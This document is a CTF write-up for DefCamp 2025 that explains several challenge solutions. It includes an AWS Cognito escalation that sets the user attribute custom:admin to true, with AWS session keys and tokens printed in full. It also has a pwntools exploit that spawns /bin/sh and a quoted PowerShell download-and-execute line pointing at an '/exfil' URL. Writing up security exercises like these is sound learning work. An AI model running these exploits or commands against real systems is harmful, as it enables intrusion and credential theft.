# DefCamp Capture the Flag 2025

B33F 50UP 19th/342 teams points > 0

![](image/930b9d6c96e4ff699d47dc2ed4aeff90.png)

Only writeups I solved

## mach-triangle

<https://grok.com/share/c2hhcmQtNA%3D%3D_899160b3-4895-40ae-9ab3-1451e3ae4ef4>

## incogni

```bash
$ cognito-scanner account-creation --region=eu-central-1 --user_attributes=vripblcirmevuqtyao@nespf.com --client_id=5ao939ku2uhauj4b69hp99bnk9 --username='vripblcirmevuqtyao@nespf.com' --password='R4nd0mP4$$word'
$ cognito-scanner get-identity-pool-keys --region=eu-central-1 --pool_id=eu-central-1_Mpd0FJnm7 --client_id=5ao939ku2uhauj4b69hp99bnk9 --identity_pool_id=eu-central-1:095ae0bb-a02d-40c9-9edc-df464a633790 --username='vripblcirmevuqtyao@nespf.com' --password='R4nd0mP4$$word'

$ export AWS_ACCESS_KEY_ID=ASIAQFLZD23RE4RXGO4M
$ export AWS_SECRET_ACCESS_KEY=rX4KMNp6bntQMgA3k9d3dvGvHOvifj1r+VKnVm4t
$ export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjELr//////////wEaDGV1LWNlbnRyYWwtMSJIMEYCIQC3ugPMaVPAQTgPCNjMvwsSOOHXegmH/gIbdP8jISoanAIhAOl8+71FaAEb+vkX+gxwaVrnX8ReFqpLuZtJi2elv7HMKtYECDMQABoMMDExNTI4Mjk2MTYyIgzJE1QHZCswKdnqAbEqswSHB+EVwFVBfMNkStU8Ail2wfPmpxpR9N9ISKt7J8WuEh1zJH9CDZOWvKwaeISwsRyn7DFpD1fi2EJqTxcgm93/bCIXdG7P1jNPPll/HTNKf/zc2zRx805wV4a+BTKjK2zDnHGecgWyNoIb09JzL8dvB7dJLsws71pSmpw5aU+sX3Pp9qs9GTsELqJBxawH8cMlTov3HlqrakIzWvv5LdGCOyGdaOoY/MXbXcyNkKFv04rFSMYEnS9NvT5rfV3URRWZ5P0ztjB3ZcUkWg8lCe4fiw5zfRgt+YZ846YnHgacEc7SltWFuDa5MwIVMc12F8f+lKUJw+pvQm8TJgec6O3ju8WWgyTiKgvX6I2DXH75ZtHQLR1CMRB+RB814+U53v6Q+kcxBjfTttLbftAlnVnpymc7ti1bKECYe1kWmbOMoH8iyVmHh/8u6hszTFqzj6B7bz+JniQpYxHSetlv6y0Kq5ksdk+wl1Pqvj7KNvALccrU3B2+uLQ413E3uYUC5g+PbtKcjhgtriDYgcmrwPVYhYi9DN6OVuagYcWD8xPbH4jA1pfPoJhlaS9LKB5qBdzHXDQ9mzpiV4sizsomuEXw3j5caJBC/CK+spzloMSiuHJUabeAzXHrOjMFD+xv+iGoYPOS7tidy9u35kFofc/GPKjs4M8bcBCREOaz7eB+e6wLpE77ASjZwu0Zk/ajwlItIPA1UqljPhb6sTGzi64U+r0Qiwf6TWLgQvFwj3jRAU20CDDdyJHGBjqEAsBtB9W1OtH6PhMTcbIsIncIl6lSxaz9DZiNf/bj53EdV5jhHQ2iwZhSsYCKkJoeAWo5kN/XEp/tc59AwIsgG3f94LjvtfT0DG/El5NEMKipROMtSnXnHokqCmo7i2Mcv0F1nGnzFyJYWc+4VB4nPv5AzL9xymSAz1hyizRlq3ibtq6c+inaIXBTgNxS8rI5FrsugvBPBQMwRV9r5lu8CwxAyNbdQHhMivIWhyzkWPMt9dHpPisib43pSCCesfei9nhjFvvTDlueJtKsH5t6BS75yFBz0WHaJpveddAnPYi0NH8kA5EtQdjTMEZWjRmfnj3i2tN4pyv55YZaB4/erwzEOe0E

$ aws configure

$ aws secretsmanager list-secrets
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:eu-central-1:011528296162:secret:incogni/flag-1de3a35e-wPq5Iv",
            "Name": "incogni/flag-1de3a35e",
            "Description": "Encrypted Flag",
            "LastChangedDate": 1757066962.899,
            "LastAccessedDate": 1757635200.0,
            "SecretVersionsToStages": {
                "terraform-20250905095613099300000004": [
                    "AWSPREVIOUS"
                ],
                "terraform-20250905100922788200000001": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": 1757066168.255
        }
    ]
}

$ aws secretsmanager describe-secret \
  --secret-id arn:aws:secretsmanager:eu-central-1:011528296162:secret:incogni/flag-1de3a35e-wPq5Iv \
  --region eu-central-1
{
    "ARN": "arn:aws:secretsmanager:eu-central-1:011528296162:secret:incogni/flag-1de3a35e-wPq5Iv",
    "Name": "incogni/flag-1de3a35e",
    "Description": "Encrypted Flag",
    "LastChangedDate": 1757066962.899,
    "LastAccessedDate": 1757635200.0,
    "VersionIdsToStages": {
        "terraform-20250905095613099300000004": [
            "AWSPREVIOUS"
        ],
        "terraform-20250905100922788200000001": [
            "AWSCURRENT"
        ]
    },
    "CreatedDate": 1757066168.255
}

$ aws secretsmanager get-secret-value \
  --secret-id arn:aws:secretsmanager:eu-central-1:011528296162:secret:incogni/flag-1de3a35e-wPq5Iv \
  --region eu-central-1
{
    "ARN": "arn:aws:secretsmanager:eu-central-1:011528296162:secret:incogni/flag-1de3a35e-wPq5Iv",
    "Name": "incogni/flag-1de3a35e",
    "VersionId": "terraform-20250905100922788200000001",
    "SecretBinary": "AQICAHiOY7I7LxgVsxvNQuH346wlm6maQB6xO10EwJzbgVYNGAFlcHkT/2K5Ov5BZVVq6qvjAAAAqDCBpQYJKoZIhvcNAQcGoIGXMIGUAgEAMIGOBgkqhkiG9w0BBwEwHgYJYIZIAWUDBAEuMBEEDHeL7fH5rPdRz1stZAIBEIBhIx+Hn1MOKk6n9a9mP7GxwFy6pPkw0j/oRiwdvMbeLo92DahiSXw/5OpicF3MaLZWTK/PW4Zd7lSKsSd05KT2EGcmrR37A5+f0N50o5yuyyNarPuwxL5mUDT77JEKkRTvGA==",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1757066962.894
}


$ aws cognito-idp initiate-auth \
  --client-id 5ao939ku2uhauj4b69hp99bnk9 \
  --auth-flow USER_PASSWORD_AUTH \
  --auth-parameters USERNAME='vripblcirmevuqtyao@nespf.com',PASSWORD='R4nd0mP4$$word' \
  --region eu-central-1

$ aws cognito-idp  get-user --region eu-central-1 --access-token='eyJraWQiOiJoNFB0SkRmc2p3Y3pzbW1leEdmNlwveTduZllaa1llNkQweVFIRVJxTFVSbz0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiI1MzI0Mzg3Mi1kMGIxLTcwNTEtZTA1Yi1mZTM4YmQxYWIxYWMiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAuZXUtY2VudHJhbC0xLmFtYXpvbmF3cy5jb21cL2V1LWNlbnRyYWwtMV9NcGQwRkpubTciLCJjbGllbnRfaWQiOiI1YW85MzlrdTJ1aGF1ajRiNjlocDk5Ym5rOSIsIm9yaWdpbl9qdGkiOiIwMDdmODM1Mi1iYmYwLTQwZDktODc2OS0wOGE3ODFjNjZjZTAiLCJldmVudF9pZCI6IjA3ZDBlZjQ1LTEyMGUtNDJkNS1iOTFhLWFiNzA2YzhjYWYxZiIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE3NTc3MDM4MTIsImV4cCI6MTc1NzcwNzQxMiwiaWF0IjoxNzU3NzAzODEyLCJqdGkiOiI5MzhiODI0My1hOTBmLTRkOTMtYjVjZS1jODJjMzQ2ODliNDAiLCJ1c2VybmFtZSI6IjUzMjQzODcyLWQwYjEtNzA1MS1lMDViLWZlMzhiZDFhYjFhYyJ9.wzZACtb2JSXruebUdkUzhAyN5HSff19mrESQtKO0q5cl2nQrLwzQyTf89H3CApb-gCwAqJWmlY_3nry9_E9pS-yZn4sKuKxZ0Kb26KVrTuP5Hf90SRim64lBzDbCaB08--bwOlGoXT7a7HVoxFz8B8Ds-OdljElYcteHVbFPOkOzHyBbxtWM0I0A4K2Fh3_9zc0Ix-YY_-bNkD_ei5UNNPU1XHzvscLhWH6T_KPC3onRWfkdNw_J-sDTKbF2pFz3Hq6i9ngyHTAbPWCikDe_TOFdokvWfvnZ26XsmC0zYjUBLgp3c4mPX05hZAn-e5X7dFs2e53nnAER-TmDJ0DIFA'


$ aws cognito-idp update-user-attributes --access-token 'eyJraWQiOiJoNFB0SkRmc2p3Y3pzbW1leEdmNlwveTduZllaa1llNkQweVFIRVJxTFVSbz0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiI1MzI0Mzg3Mi1kMGIxLTcwNTEtZTA1Yi1mZTM4YmQxYWIxYWMiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAuZXUtY2VudHJhbC0xLmFtYXpvbmF3cy5jb21cL2V1LWNlbnRyYWwtMV9NcGQwRkpubTciLCJjbGllbnRfaWQiOiI1YW85MzlrdTJ1aGF1ajRiNjlocDk5Ym5rOSIsIm9yaWdpbl9qdGkiOiIwMDdmODM1Mi1iYmYwLTQwZDktODc2OS0wOGE3ODFjNjZjZTAiLCJldmVudF9pZCI6IjA3ZDBlZjQ1LTEyMGUtNDJkNS1iOTFhLWFiNzA2YzhjYWYxZiIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE3NTc3MDM4MTIsImV4cCI6MTc1NzcwNzQxMiwiaWF0IjoxNzU3NzAzODEyLCJqdGkiOiI5MzhiODI0My1hOTBmLTRkOTMtYjVjZS1jODJjMzQ2ODliNDAiLCJ1c2VybmFtZSI6IjUzMjQzODcyLWQwYjEtNzA1MS1lMDViLWZlMzhiZDFhYjFhYyJ9.wzZACtb2JSXruebUdkUzhAyN5HSff19mrESQtKO0q5cl2nQrLwzQyTf89H3CApb-gCwAqJWmlY_3nry9_E9pS-yZn4sKuKxZ0Kb26KVrTuP5Hf90SRim64lBzDbCaB08--bwOlGoXT7a7HVoxFz8B8Ds-OdljElYcteHVbFPOkOzHyBbxtWM0I0A4K2Fh3_9zc0Ix-YY_-bNkD_ei5UNNPU1XHzvscLhWH6T_KPC3onRWfkdNw_J-sDTKbF2pFz3Hq6i9ngyHTAbPWCikDe_TOFdokvWfvnZ26XsmC0zYjUBLgp3c4mPX05hZAn-e5X7dFs2e53nnAER-TmDJ0DIFA' --region eu-central-1 --user-attributes '[{"Name":"custom:admin","Value":"true"}]'

remember to get the credential again using cognito-scanner get-identity-pool-keys

$ aws kms decrypt   --ciphertext-blob fileb://secret.bin   --region eu-central-1
{
    "KeyId": "arn:aws:kms:eu-central-1:011528296162:key/79d35eb0-0dba-40f7-b76c-86791cf500a5",
    "Plaintext": "RENURnswNWIyOTkwOTk0OWMyMmIzNWE5NTk0YzE2MTAyNjc0NjkwMDllNDkyZGZkMjczMjNiNzg5ZDY2NDlkMGNjYzExfQ==",
    "EncryptionAlgorithm": "SYMMETRIC_DEFAULT",
    "KeyMaterialId": "8e63b23b2f1815b31bcd42e1f7e3ac259ba99a401eb13b5d04c09cdb81560d18"
}
```

## nulle

The program will execute the first 8 bytes of input as function pointer and the following bytes as the first
argument as string. Just call `system("/bin/sh")`

```python
#!/usr/bin/env python3
'''
Pwn3d by pwn2ooown.tech
'''
from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
if len(sys.argv) == 1:
    r = process("./main")
    if args.GDB:
        gdb.attach(r,"b *0x40122d\n")
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))

sla("ng",p64(0x401090)+b"/bin/sh\x00")

r.interactive()
```

## malware

```bash
root@c-d355-c9609t-l3440-malware-5fb996bbc5-kjfrb:/proc/627# cat /proc/net/tcp
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 235301 1 0000000000000000 100 0 0 10 0
   1: 1B0C240A:C644 795AE240:15B3 02 00000001:00000000 01:0000181E 0000000A     0        0 348204 2 0000000000000000 6400 0 0 1 7
   2: 1B0C240A:95C6 795AE240:15B3 02 00000001:00000000 01:0000007A 00000006     0        0 350625 2 0000000000000000 400 0 0 1 7
   3: 1B0C240A:0016 5373748C:C640 01 000001BC:00000000 01:00000016 00000000     0        0 318478 4 0000000000000000 43 4 1 17 45
   4: 1B0C240A:A8E6 795AE240:15B3 02 00000001:00000000 01:000000EA 0000000A     0        0 341926 2 0000000000000000 6400 0 0 1 7
```

`795AE240:15B3 -> 64.226.90.121:5555`

### forensalyze-this

Use FTK Imager to open the ad1 file

#### A1

![image](image/1670ca5d45b7de41ccb8f1574d98bacc.png)

The answer is `IEX ((new-object net.webclient).downloadstring('http://10.10.10.10:80/exfil'))`

#### A2

![image](image/f699af6859458b5b8df68a49ffb83ad3.png)

Just extract the `/home/user/.local/bin/sysupdater` out to calculate the sha256 `2e8eda459ca839d24b6c759e23f1fd8108da203a735077c3c85e4438318e174c`

#### A3

![image](image/5b185348933d78d10613926c81f966e7.png)

Vacation photo is not jpg it's txt. Content

```
email=ceo@company.com; pass=Secret123!
```

#### A4

![image](image/375622b10ba02c1c85bbc489b43859ff.png)

`Work` directory

#### A5

![image](image/e4f89719dc0d31eee916cc6f752bedc3.png)

`Engineering`

#### A6

![image](image/72b9b20f4d45a06e9107b613d165540d.png)

1000:1000

#### A7

![image](image/cabd604dbb19a8a342c57fe16d76be17.png)

See syslog, it's at `12:12:35`

### east-grandma


Use binwalk to show a hidden 7z

```bash!
$ binwalk camashadefortza.jpg                         camashadefortza.jpg
------------------------------------------------------------------------------------------------------------------------------------------------
DECIMAL                            HEXADECIMAL                        DESCRIPTION
------------------------------------------------------------------------------------------------------------------------------------------------
0                                  0x0                                JPEG image, total size: 206006 bytes
206006                             0x324B6                            7-zip archive data, version 0.4, total size: 327042 bytes
------------------------------------------------------------------------------------------------------------------------------------------------

Analyzed 1 file for 85 file signatures (187 magic patterns) in 34.0 milliseconds
```

Use 7z2john to convert the encrypted hash of 7z `$7z$0$19$0$$16$0cb3ababf964175a592ec4dec8ee51f7$1105515733$144$130$8c9fc34a5ad969da07afcc12b237e17edba92378483eb8739cfb7fae7864c188b2826d8bd8d21cf242040e5cff4a3aec74dcdd80690a30bcc3317b0da6a2559a67e6e3c0c1ab8f9937277854008079c15061e7d27ae0b5b002a435cebf896513736426a7ce7e1ba72300ebf281cc953441f292d83c7970a6e9829e59b2ec1db24f9e8b71466a3bb305af0fcad0e3858c` and use hashcat and rockyou.txt to crack the password `passwordpassword`

Finally `strings 7zip_324B6/beaches.001| grep ctf` the extracted file `Tip de muzica: Rock Alternativ .... ce gluma ... muzica de vitamina ctf{sha256(vamonos)}`

`ctf{44ad656b71865ac4ad2e485cfbce17423e0aa0bcd9bcdf2d98a1cb1048cf4f0e}`

## Threat Hunting

### grandbazaar

> by Ankleboy

#### A1

![image](image/7a2be08530b81eeb81d9ee30e652c708.png)

`FROM .alerts-security.alerts-default` answer is 23

#### A2

![image](image/4aa25d23b645facf7b8d4728ce7d869a.png)

![image](image/d917c64dc9608f9243347f121b92f7c4.png)

`DCTF{a31e56a60d7c9b547b1e7dfe402d7fb02789dcd117eadf59593e5401460843d4:a2254802dd387d0e0ceb61e2849a44b51879f625b89879e29592c80da9d479a2}`

#### A3

You can download the malware from https://malshare.com/sample.php?action=detail&hash=97517b7480182b69b42dc58d2c61f7e0 and use https://emn178.github.io/online-tools/sha3_384_checksum.html to calculate the hash `4f9c609d2f44b18b359d2e52061889302da0dca8e3d244a3e4759b5e78463a9e9fc9046d4acd3e0c7a866f0a01beff3b`

#### A4

![image](image/3032c180da1d57c4303f2007b3d3ab46.png)

Virustotal see python

#### A5

![image](image/d88970617208bfd16b0a59854f9fef9a.png)

`discord.com`

#### A6

See results at https://any.run/report/a31e56a60d7c9b547b1e7dfe402d7fb02789dcd117eadf59593e5401460843d4/672a9fb1-f548-4b69-842e-ce2e59ea8492

![image](image/a1d431723886b3aca3a88ef516332392.png)


#### A8

`FROM .alerts-security.alerts-default | WHERE process.parent.executable == "C:\\Users\\malware\\AppData\\Roaming\\svchost.exe"`


![image](image/4bddc3c441d3efedea49cc0f5cf9f56b.png)


#### A9

https://www.joesandbox.com/analysis/1767246/0/html

![image](image/15b5e380569624ebf835948b1fc289dc.png)


`GOATEDSIGMA`

#### A10

https://www.joesandbox.com/analysis/1767246/0/html

![image](image/15b5e380569624ebf835948b1fc289dc.png)

`You have been infected by Bat..All your files have been encrypted..If u want them back it's simple just gimme ur Roblox / Discord cookies..Roblox : Go tto chrome and rblx site and right click inspect and then to to applications and cookies..then paste the whole thing to me...Same for discord....Once ur done add me on discord User : realba3t..and give it to me and ull get ur files.....U have 15 mins....`

`realba3t`

## Network

### hidden-cipher

Do the port knock same as the given pcap

![image](image/cc2d7c1b79c4fb9506b0608601e19f6f.png)

UDP 4321
TCP 1234
UDP 5432
TCP 2345
TCP 9999

And the flag will be on localhost port 4000

![image](image/f256edc89f73bfa55fa615796f3887da.png)
